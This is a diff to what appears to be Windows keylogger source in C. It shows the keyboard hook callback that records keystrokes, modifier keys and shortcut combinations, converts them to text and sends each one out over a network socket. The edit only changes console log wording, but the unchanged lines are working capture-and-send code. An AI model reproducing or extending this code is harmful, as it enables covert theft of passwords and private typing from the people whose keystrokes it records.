@@ -99,7 +99,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			if (vkCode < 256) keyStateTracker[vkCode] = FALSE;
 
 			if (pendingCtrl && (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL)) {
-				wprintf(L"Sent: [CTRL]\n");
+				wprintf(L"Sent -> [CTRL]\n");
 				fflush(stdout);
 				send(sock, "[CTRL]", 6, 0);
 				pendingCtrl = FALSE;
@@ -115,7 +115,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 					else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL) modName = "[CTRL]";
 
 					if (modName != NULL) {
-						wprintf(L"Sent: %hs\n", modName);
+						wprintf(L"Sent -> %hs\n", modName);
 						fflush(stdout);
 						send(sock, modName, (int)strlen(modName), 0);
 					}
@@ -158,7 +158,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			}
 
 			if (isAltGrKey) {
-				wprintf(L"Sent: [ALTGR]\n");
+				wprintf(L"Sent -> [ALTGR]\n");
 				fflush(stdout);
 				send(sock, "[ALTGR]", 7, 0);
 				comboUsed = TRUE;
@@ -195,7 +195,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuf, 8, 0, layout);
 
 			if (!hasShortcutModifier && result > 0 && unicodeBuf[0] >= 32) {
-				wprintf(L"Sent: %.*ls\n", result, unicodeBuf);
+				wprintf(L"Sent -> %.*ls\n", result, unicodeBuf);
 				fflush(stdout);
 
 				char utf8Buf[32] = { 0 };
@@ -227,7 +227,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 					sprintf_s(comboBuf, sizeof(comboBuf), "[%s]", keyName);
 				}
 
-				wprintf(L"Sent: %hs\n", comboBuf);
+				wprintf(L"Sent -> %hs\n", comboBuf);
 				fflush(stdout);
 
 				send(sock, comboBuf, (int)strlen(comboBuf), 0);
